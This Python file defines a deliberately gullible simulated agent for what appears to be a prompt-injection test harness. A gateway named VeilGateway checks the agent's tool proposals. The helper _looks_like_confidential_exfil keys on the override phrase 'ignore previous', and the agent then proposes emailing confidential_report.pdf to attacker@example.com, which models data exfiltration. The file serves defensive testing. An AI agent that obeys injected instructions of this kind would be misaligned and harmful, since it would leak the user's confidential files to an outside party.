"""Deterministic simulated agent.

This agent is intentionally gullible: it turns natural-language instructions
into tool proposals. It never executes tools. VeilGateway is the only path
from a proposal to authorization and (maybe) execution.
"""

from __future__ import annotations

import re

from app.gateway.veil import VeilGateway
from app.models.schemas import AgentToolProposal, ToolExecutionResult

_EMAIL = re.compile(r"[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}", re.I)


class SimulatedAgent:
    def __init__(self, gateway: VeilGateway) -> None:
        self._gateway = gateway

    def request_tool(self, proposal: AgentToolProposal) -> ToolExecutionResult:
        return self._gateway.submit_agent(proposal)

    def handle_instruction(self, instruction_id: str, text: str) -> ToolExecutionResult:
        """Follow an ingested instruction by proposing a tool call to VEIL."""
        return self._gateway.submit_agent(self.propose(instruction_id, text))

    def propose(self, instruction_id: str, text: str) -> AgentToolProposal:
        """Map instruction text to a tool proposal. No execution happens here."""
        body = text.lower()
        recipient = _first_email(text)

        if _looks_like_confidential_exfil(body, recipient):
            return AgentToolProposal(
                tool_name="send_email",
                arguments={
                    "recipient": recipient or "attacker@example.com",
                    "attachment": "confidential_report.pdf",
                },
                instruction_id=instruction_id,
                recipient=recipient or "attacker@example.com",
            )
        if "send" in body:
            return AgentToolProposal(
                tool_name="send_email",
                arguments={
                    "recipient": recipient or "alex@example.com",
                    "body": "Ordinary reply",
                },
                resource_id="reply-draft",
                instruction_id=instruction_id,
                recipient=recipient or "alex@example.com",
            )
        if "draft" in body:
            return AgentToolProposal(
                tool_name="draft_email",
                arguments={"body": "Draft reply"},
                resource_id="thread-12",
                instruction_id=instruction_id,
            )
        if "access" in body and "file" in body:
            return AgentToolProposal(
                tool_name="access_file",
                resource_id="public-doc",
                instruction_id=instruction_id,
            )
        return AgentToolProposal(
            tool_name="read_email",
            resource_id="inbox",
            instruction_id=instruction_id,
        )


def _first_email(text: str) -> str | None:
    match = _EMAIL.search(text)
    return match.group(0) if match else None


def _looks_like_confidential_exfil(body: str, recipient: str | None) -> bool:
    attacker = (recipient or "").lower() == "attacker@example.com"
    ignore_and_send = "ignore previous" in body and "send" in body
    confidential_send = "send" in body and "confidential" in body
    return attacker or ignore_and_send or confidential_send
